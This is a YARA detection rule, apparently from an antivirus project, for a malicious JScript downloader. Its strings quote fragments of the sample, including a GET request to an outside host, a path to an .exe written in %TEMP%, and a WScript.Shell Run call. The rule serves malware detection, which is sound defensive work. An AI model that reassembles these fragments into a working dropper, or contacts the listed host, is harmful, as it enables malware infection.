rule sig_20160329_93268e8a7375c0c2badc98a9bd4f19ad {
  meta:
    description = "datamaliciousorder - file 20160329_93268e8a7375c0c2badc98a9bd4f19ad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b99cb5fb8f975795ade388e7a039dcefd8fb00c41ea0537a3969499aeb72b47"

  strings:
    $s1  = "function Xl() {return on[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XatuLQpybTa7M.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[wj](b0() * 11); if (r[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function K0(R, s){iW = iW * 1; return R - s;};" fullword ascii
    $s4  = "r[gC](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s5  = "var on = function W() {return WScript[yC](\"WScript.Shell\");}(), f = 11;" fullword ascii
    $s6  = "function t(){return \"\" + tS;};" fullword ascii
    $s7  = "function b() {return ((a == true) && (a == SZ)) ? 1 : iW;};" fullword ascii
    $s8  = "function V(i){on[\"Run\"](i, iW, iW);};" fullword ascii
    $s9  = " while (N){" fullword ascii
    $s10 = "function j()" fullword ascii
    $s11 = "function B(Tx) {var wD = (1, 2, 3, 4, 5, Tx); return wD;};" fullword ascii
    $s12 = "var A = new this[\"Date\"]();" fullword ascii
    $s13 = "return K0(Pw, O0);" fullword ascii
    $s14 = "function b0(){return 22;};" fullword ascii
    $s15 = "function K(){return yC;};" fullword ascii
    $s16 = "var a = false;" fullword ascii
    $s17 = "a = true; " fullword ascii
    $s18 = "SZ = true; " fullword ascii
    $s19 = "var Hm = false;" fullword ascii
    $s20 = "var SZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}